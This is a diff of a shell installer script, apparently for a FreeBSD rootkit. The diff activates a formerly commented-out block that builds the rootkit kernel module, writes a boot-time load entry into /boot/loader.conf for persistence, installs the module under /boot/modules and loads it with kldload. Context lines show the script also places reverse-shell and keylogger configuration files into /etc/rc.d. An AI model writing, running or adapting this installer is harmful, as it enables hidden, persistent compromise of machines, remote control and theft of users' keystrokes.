@@ -35,7 +35,6 @@ RC_INSTALL_LOCATION="/etc/rc.d/"
 RC_CONF_FILE="/etc/rc.conf"
 USR_SBIN="/usr/sbin/"
 
-
 INSTALL="/boot/modules"
 LOADER_CONF="/boot/loader.conf"
 LOADER_CONF_TRANSPARENT="/boot/loader.conf.transparent"
@@ -47,6 +46,22 @@ cat << "EOF"
 |_,_|___|_| |_|_|___|_|_____|___|__|__|___|_____|___|
 
 EOF
+
+cd $KMOD
+
+echo ">> Clean existing build."
+make clean
+
+echo ">> Build rootkit."
+make
+
+echo ">> Install rootkit kernel module."
+
+echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
+touch $LOADER_CONF_TRANSPARENT
+
+mv $KMOD/$KO $INSTALL/$KO
+kldload $INSTALL/$KO
 
 cd $BINARIES
 
@@ -86,23 +101,6 @@ mv $BINARIES/$RSHELL_CONF_FILE $RC_INSTALL_LOCATION
 
 echo ">> Move keylog configuration file into /etc/rc.d."
 mv $BINARIES/$KEYLOG_CONF_FILE $RC_INSTALL_LOCATION
-
-# cd $KMOD
-
-# echo ">> Clean existing build."
-# make clean
-
-# echo ">> Build rootkit."
-# make
-
-#echo ">> Install rootkit kernel module."
-
-#echo ""$NAME"_load=\"YES\"" > $LOADER_CONF
-#touch $LOADER_CONF_TRANSPARENT
-
-#mv $KMOD/$KO $INSTALL/$KO
-#kldload $INSTALL/$KO
-
 
 if [ "$2" = "DEBUG" ]
 then
